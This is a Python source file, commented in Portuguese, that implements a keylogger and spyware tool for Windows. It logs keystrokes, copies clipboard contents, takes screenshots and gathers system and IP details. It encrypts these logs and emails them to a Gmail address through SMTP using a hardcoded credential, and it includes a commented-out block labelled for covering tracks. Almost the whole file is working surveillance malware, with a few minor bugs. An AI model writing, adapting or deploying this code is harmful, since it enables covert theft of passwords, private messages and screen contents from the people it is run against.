# Imports necessários

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os
import schedule

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Nomes dos arquivos de log e informações
keys_information = "key_logs.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

# Configurações de tempo e iterações
time_iterations = 15
number_of_iterations_end = 3

# Configurações de e-mail
email_address = "xxx@gmail.com" #email criado para este teste
password = "oxrp wnoi depw ukcp" #utilizei outro método de senha pois o smtp estava barrando as senhas normais

# Informações do usuário
username = getpass.getuser()

# Diretório de destino para verificação diária
target_dir = "C:/temp/dados"

# Informações adicionais para e-mail e criptografia
toaddr = "xxx@gmail.com"
key = "MmqEB92YMPPzJSY2kgp-p5Tehe3oN7S1LLMLIQOQYxk="
file_path = "C:\\xxx\\xxx\\xxx\\xxx"
extend = "\\"
file_merge = file_path + extend


# Controles de e-mail
def send_email(filename, attachment, toaddr):
    """
        Envia um e-mail com um anexo especificado.

        :param filename: Nome do arquivo no e-mail
        :param attachment: Caminho do arquivo a ser anexado
        :param toaddr: Endereço de e-mail de destino
    """
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload(attachment.read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attatchment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

# Envia um e-mail com o arquivo de logs de teclas pressionadas
send_email(keys_information, file_path + extend + keys_information, toaddr)


# Obtém informações do computador
def computer_information():
    """
        Obtém e registra informações do computador.

        Registra informações como o endereço IP, processador, sistema operacional, etc.
    """
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

computer_information()

# Obtém o conteúdo da área de transferência
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

# Obtém capturas de tela
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

# Inicializa variáveis para o timer do keylogger
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iterations

# Timer para o keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []


    # Base do keylogger
    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iterations

# Encripta os arquivos
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names, toaddr)
    count += 1

time.sleep(120)


def check_dir(directory):
    try:
        # Listar os arquivos no diretório
        archives = os.listdir(directory)

        if archives:
            print(f"Conteúdo do diretório {directory}:")
            for archive in archives:
                print(archive)
        else:
            print(f"O diretório {directory} está vazio.")

    except Exception as e:
        print(f"Erro ao verificar o diretório {directory}: {str(e)}")

def daily_task():
    print("Verificando o diretório diariamente:")
    check_dir(target_dir)

# Agendar a tarefa diariamente às 00:00
schedule.every().day.at("00:00").do(daily_task())

# Loop principal para executar a verificação agendada
while True:
    schedule.run_pending()
    time.sleep(1)


"""
# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information]
for file in delete_files:
    os.remove(file_merge + file)
"""

